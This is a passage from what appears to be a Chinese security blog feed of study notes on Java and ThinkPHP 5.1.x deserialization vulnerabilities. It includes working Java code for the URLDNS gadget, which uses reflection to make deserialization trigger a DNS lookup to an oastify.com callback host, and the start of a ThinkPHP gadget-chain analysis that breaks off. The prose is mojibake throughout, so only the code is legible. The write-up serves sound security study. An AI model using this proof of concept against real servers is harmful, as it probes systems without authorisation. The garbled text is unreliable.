æä¾›çš„åºåˆ—åŒ–æ¥å£,ä¸€ä¸ªå®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Useri</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Useri</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        Serialize(user);</span><br><span class="line"></span><br><span class="line">        Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Useri obj)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialized:&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Useri</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Useri</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transient</strong></p><p>transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å¯ä»¥çœ‹è§ååºåˆ—åŒ–å, ä¼šè‡ªåŠ¨è°ƒç”¨readObject()æ–¹æ³•(åœ¨phpä¸­åˆ™æ˜¯__wakeupè¿™æ ·çš„æ–¹æ³•), è€Œå¦‚æœç¨‹åºå¯¹readObject()è¿›è¡Œäº†é‡å†™, å¹¶æ·»åŠ äº†ä¸€äº›å±é™©æ“ä½œ, å°±ä¼šåœ¨ååºåˆ—åŒ–åè‡ªåŠ¨è¿›è¡Œè¿™äº›ä¸ªå±é™©æ“ä½œ, </p><h3 id="å…¥å£ç±»"><a href="#å…¥å£ç±»" class="headerlink" title="å…¥å£ç±»"></a>å…¥å£ç±»</h3><blockquote><p>å…¥å£ç±»ä¸€èˆ¬æ˜¯<code>Map,Hashmap,HashTable</code>è¿™äº›é›†åˆç±»ï¼Œå› ä¸ºé›†åˆç±»å‹å®½æ³›ï¼ˆæ³›å‹ï¼‰ï¼Œå› æ­¤è‚¯å®šç»§æ‰¿äº†<code>Serializeable</code>æ¥å£ï¼Œåœ¨<code>Hashmap</code>ç±»ä¸­ä¹Ÿé‡å†™äº†<code>readObject</code>æ–¹æ³•</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309195913040.png" alt="image-20240309195913040"></p><p>ä¸ºä»€ä¹ˆé‡å†™?</p><blockquote><p>HashMapä¸­ï¼Œç”±äºEntryçš„å­˜æ”¾ä½ç½®æ˜¯æ ¹æ®Keyçš„Hashå€¼æ¥è®¡ç®—ï¼Œç„¶åå­˜æ”¾åˆ°æ•°ç»„ä¸­çš„ï¼Œå¯¹äºåŒä¸€ä¸ªKeyï¼Œåœ¨ä¸åŒçš„JVMå®ç°ä¸­è®¡ç®—å¾—å‡ºçš„Hashå€¼å¯èƒ½æ˜¯ä¸åŒçš„ã€‚<br>Hashå€¼ä¸åŒå¯¼è‡´çš„ç»“æœå°±æ˜¯ï¼šæœ‰å¯èƒ½ä¸€ä¸ªHashMapå¯¹è±¡çš„ååºåˆ—åŒ–ç»“æœä¸åºåˆ—åŒ–ä¹‹å‰çš„ç»“æœä¸ä¸€è‡´ã€‚å³æœ‰å¯èƒ½åºåˆ—åŒ–ä¹‹å‰ï¼ŒKey&#x3D;â€™AAAâ€™çš„å…ƒç´ æ”¾åœ¨æ•°ç»„çš„ç¬¬0ä¸ªä½ç½®ï¼Œè€Œååºåˆ—åŒ–å€¼åï¼Œæ ¹æ®Keyè·å–å…ƒç´ çš„æ—¶å€™ï¼Œå¯èƒ½éœ€è¦ä»æ•°ç»„ä¸º2çš„ä½ç½®æ¥è·å–ï¼Œè€Œæ­¤æ—¶è·å–åˆ°çš„æ•°æ®ä¸åºåˆ—åŒ–ä¹‹å‰è‚¯å®šæ˜¯ä¸åŒçš„</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>ä»¥ysoserialä¸­çš„URLDNSä½œä¸ºä¸€ä¸ªä¾‹å­</p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>ä¸Šé¢å·²ç»çœ‹è§äº†hashMapå¯¹readObjectçš„é‡å†™, é‡ç‚¹å…³æ³¨ä»¥ä¸‹å†…å®¹, åœ¨readObjectçš„æœ€å, è°ƒç”¨çš„putVal</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309201854085.png" alt="image-20240309201854085"></p><p>é¦–å…ˆè·Ÿè¿›hashå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309202142278.png" alt="image-20240309202142278"></p><p>è¿™é‡Œè°ƒç”¨äº†key.hashCode(), è€ŒObject keyæ˜¯å¯æ§çš„, å› æ­¤å°±å¯ä»¥è°ƒç”¨å¯æ§ç±»ä¸‹çš„hashCode()æ–¹æ³•</p><p>ç°åœ¨è½¬å‘URLç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309203605526.png" alt="image-20240309203605526"></p><p>æˆ‘ä»¬å‘ç°URLç±»ä¸‹ä¹Ÿæœ‰ä¸€ä¸ªhashCodeæ–¹æ³•, å› æ­¤å¦‚æœæˆ‘ä»¬å°†å¯æ§ç±»ä¼ å…¥ä¸ºä¸€ä¸ªURLå¯¹è±¡, è¿™é‡Œçš„hashCodeå°±ä¼šè¢«è°ƒç”¨</p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªhashCodeå€¼çš„åˆ¤æ–­, å½“å…¶ä¸ä¸º-1æ—¶ç›´æ¥è¿”å›hashCode</p><p>å¥½åœ¨å…¶é»˜è®¤å€¼ä¸º-1, ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œä¼šè½¬åˆ°hashCode &#x3D; handler.hashCode(this);</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309204051582.png" alt="image-20240309204051582"></p><p>è§‚å¯Ÿç¬¬367è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªè·å–ä¸»æœºåœ°å€çš„å‡½æ•°</p><p>å› æ­¤, å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªvpsçš„urlåœ°å€, è¿™é‡Œå°±ä¼šè§¦å‘ä¸€æ¬¡å¯¹æˆ‘ä»¬vpsåœ°å€çš„è§£æ, </p><p>å€˜è‹¥vpsæ”¶åˆ°è¿™ä¸ªè§£æ, å°±èƒ½å¤Ÿè¯æ˜ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰è¶£çš„æ˜¯è¿™é‡Œåºåˆ—åŒ–æ—¶ä¹Ÿä¼šå‘èµ·ä¸€ä¸ªdnsè¯·æ±‚</p><p>è°ƒè¯•çœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213620334.png" alt="image-20240309213620334"></p><p>è·Ÿè¿›putæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213725383.png" alt="image-20240309213725383"></p><p>ä¸‹ä¸€æ­¥ç›´æ¥è°ƒç”¨äº†putVal ä¸”keyå°±æ˜¯æˆ‘ä»¬è¦è§£æçš„URL</p><p>æ‰€ä»¥, åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šå‘èµ·ä¸€æ¬¡dnsè§£æ</p><p>å†è°ƒè¯•ååºåˆ—åŒ–, ä¹Ÿä¼šæ‰§è¡Œåˆ°è¿™é‡Œ</p><p>å› æ­¤å°±æ— æ³•åˆ¤æ–­å“ªä¸€ä¸ªè¯·æ±‚æ˜¯æ¥è‡ªååºåˆ—åŒ–</p><p>æ­¤æ—¶å°±è¦å¼•å…¥ä¸Šé¢æåˆ°çš„åå°„</p><p>é€šè¿‡åå°„, åœ¨putæ—¶å°†hashCodeçš„å€¼è®¾ç½®ä¸º-1, ä»è€Œä¸æ‰§è¡Œåé¢çš„ä¸€ç³»åˆ—æ–¹æ³•, åœ¨æ­¤ä¹‹å, åˆå°†hashCodeè®¾ç½®ä¸ºå…¶ä»–æ•°å­—, ä½¿å…¶åœ¨ååºåˆ—åŒ–æ—¶åˆèƒ½å¤Ÿè§¦å‘dnsè¯·æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, <span class="number">123</span>); <span class="comment">// ä¿®æ”¹urlä¸­çš„hashcodeä¸ºé-1</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//hashmap.put(new URL(&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;), 1);</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">       <span class="comment">// Object obj = unserialize();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;obj&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶,åºåˆ—åŒ–æ—¶å°±ä¸ä¼šäº§å‡ºdnsè¯·æ±‚, è€Œååºåˆ—åŒ–æ—¶ä¼šå‘èµ·dns</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JavaåŸºç¡€è¯­æ³•&quot;&gt;&lt;a href=&quot;#JavaåŸºç¡€è¯­æ³•&quot; class=&quot;headerlink&quot; title=&quot;JavaåŸºç¡€è¯­æ³•&quot;&gt;&lt;/a&gt;JavaåŸºç¡€è¯­æ³•&lt;/h1&gt;&lt;h2 id=&quot;SOUTå’ŒSOUFè¾“å‡º&quot;&gt;&lt;a href=&quot;#SOUTå’ŒSOUFè¾“å‡º&quot; class</summary>
      
    
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.1.xååºåˆ—åŒ–</title>
    <link href="http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-03-04T14:28:24.000Z</published>
    <updated>2024-03-06T09:23:39.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-xååºåˆ—åŒ–"><a href="#ThinkPHP-5-1-xååºåˆ—åŒ–" class="headerlink" title="ThinkPHP 5.1.xååºåˆ—åŒ–"></a>ThinkPHP 5.1.xååºåˆ—åŒ–</h1><p>æˆ‘ä»¬å·²ç»å­¦ä¹ äº†phpååºåˆ—åŒ–çš„åŸºç¡€æ“ä½œ,ä½†è¿™è¿œè¿œä¸å¤Ÿ</p><p> å‰ä¸ä¹…åœ¨æ¯”èµ›ä¸­é‡åˆ°è¿‡å‡ æ¬¡thinkPHPååºåˆ—åŒ–çš„é¢˜ç›®, è®©äººæ‘¸ä¸ç€å¤´è„‘, æœ€è¿‘åˆåœ¨å¤§ä½¬åšå®¢ä¸­æ— æ„é—´åˆ·åˆ°äº†è¿™éƒ¨åˆ†å†…å®¹, åœ¨è¿™é‡Œè¿›è¡Œå­¦ä¹ </p><p>å‚è€ƒ: <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º:"></a>ç¯å¢ƒæ­å»º:</h2><ol><li>php7.2.34nts(phpstudy)</li><li>thinkPHP5.1.34</li></ol><h2 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h2><p>é¦–å…ˆå°±æ˜¯tp5.1.34çš„å®‰è£…, å‡ æ¬¡ä»ç½‘ä¸Šä¸‹è½½éƒ½ä¸æˆåŠŸ,æœ€ç»ˆæ–¹æ³•æ˜¯:</p><p>åœ¨phpstudyçš„composer2.5.8</p><p>åœ¨ç»ˆç«¯æ‰“å¼€composer2.5.8çš„ç›®å½•è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5_1_37</span><br></pre></td></tr></table></figure><p>ä¸‹è½½åè¿›å…¥tpçš„ç›®å½•</p><p>æŠŠâ€topthink&#x2F;frameworkâ€: â€œ5.1.*â€æ”¹æˆâ€topthink&#x2F;frameworkâ€: â€œ5.1.37â€</p><p>ä¹‹å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­"></a>é“¾å­</h3><p><strong>é¦–å…ˆè·Ÿä¸€éå¦‚ä½•æ‰¾é“¾å­</strong></p><p>ç”±ä¹‹å‰æ‰€å­¦çš„çŸ¥è¯†å¯ä»¥æ‰¾åˆ°, phpååºåˆ—åŒ–æœ€å¸¸è§çš„å…¥å£å°±æ˜¯<code>__destruct()</code>å’Œ<code>__wakeup()</code>å…¶ä¸­æœ€å¸¸è§çš„å°±å±<code>__destruct()</code></p><p>è¿™é‡Œä¹Ÿæ­£æ˜¯åˆ©ç”¨<code>__destruct()</code>ä½œä¸ºå…¥å£</p><p>é¦–å…ˆseayå…¨å±€æŸ¥æ‰¾<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304224653354.png" alt="image-20240304224653354"></p><p>æˆ‘ä»¬è¦ä½¿ç”¨çš„å°±æ˜¯<strong>think\process\pipes\Windows</strong> ç±»çš„ <strong>__destruct</strong> </p><p>å…¶ç›®å½•ä½ç½®: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225102324.png" alt="image-20240304225102324"></p><p>è·Ÿè¿›removeFiles()è¿™ä¸ªå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225229060.png" alt="image-20240304225229060"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ª**file_exists($filename)**å‡½æ•°, æœ‰è¶£çš„æ˜¯è¿™é‡Œçš„æ–‡ä»¶å <strong>$filename</strong> å˜é‡æ˜¯å¯æ§ã€‚å¦‚æœæˆ‘ä»¬å°†ä¸€ä¸ªç±»èµ‹å€¼ç»™ <strong>$filename</strong> å˜é‡ï¼Œé‚£ä¹ˆåœ¨ <strong>file_exists($filename)</strong> çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªç±»çš„ <strong>__toString</strong> æ–¹æ³•ã€‚</p><p>å…¨å±€æœç´¢**__toString()**æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225657758.png" alt="image-20240304225657758"></p><p>è¿™é‡Œé€‰ç”¨<strong>think&#x2F;concern&#x2F;Conversion</strong>ç±»</p><p>ç›®å½•è·¯å¾„: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304230129898.png" alt="image-20240304230129898"></p><p>è·Ÿè¿›**toJson()**æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231418906.png" alt="image-20240304231418906"></p><p>ç»§ç»­è·Ÿè¿›<strong>toArray()</strong></p><p>åœ¨<strong>toArray</strong>ä¸­**$relation<strong>å¯æ§, å¹¶ä¸”èµ‹å€¼åè°ƒç”¨</strong>$relation<strong>ä¸‹çš„</strong>visible()**</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231547711.png" alt="image-20240304231547711"></p><p>è·Ÿè¿›<strong>getAttr()æ–¹æ³•</strong>çœ‹çœ‹$relationåˆ°åº•ä»ä½•è€Œæ¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231259379.png" alt="image-20240304231259379"></p><p>è·Ÿè¿›<strong>getData()</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305001517580.png" alt="image-20240305001517580"></p><p>$this-&gt;data[$name]å¯æ§</p><p>è¿™é‡Œé™„ä¸€å¼ å¤§ä½¬çš„å›¾</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/4.png"></p><p>ä¾ç…§å¤§ä½¬çš„æ€è·¯, è¿™é‡Œæ²¡æœ‰å¯åˆ©ç”¨çš„visibleæ–¹æ³•, éœ€è¦ä¸€ä¸ª**_call()<strong>æ¥è¢«è¿™ä¸ª</strong>$relation-&gt;visible($name);**è§¦å‘</p><p>ä¾æ—§æ˜¯å…¨å±€æœç´¢, åœ¨<strong>think&#x2F;request</strong>ç±»ä¸­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002602378.png" alt="image-20240305002602378"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002656453.png" alt="image-20240305002656453"></p><p>è¿™é‡Œ <strong>call_user_func_array</strong> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å®Œå…¨å¯æ§, å› æ­¤æˆ‘ä»¬å¯ä»¥è°ƒç”¨<strong>call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args)</strong>, </p><p>è™½ç„¶ç¬¬330è¡Œç”¨ <strong>array_unshift</strong> å‡½æ•°æŠŠæœ¬ç±»å¯¹è±¡ <strong>$this</strong> æ”¾åœ¨æ•°ç»„å˜é‡ <strong>$args</strong> çš„ç¬¬ä¸€ä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¯»æ‰¾ä¸å—è¿™ä¸ªå‚æ•°å½±å“çš„æ–¹æ³•ã€‚</p><blockquote><p>åˆ†æè¿‡ <strong>ThinkPHP</strong> å†å² 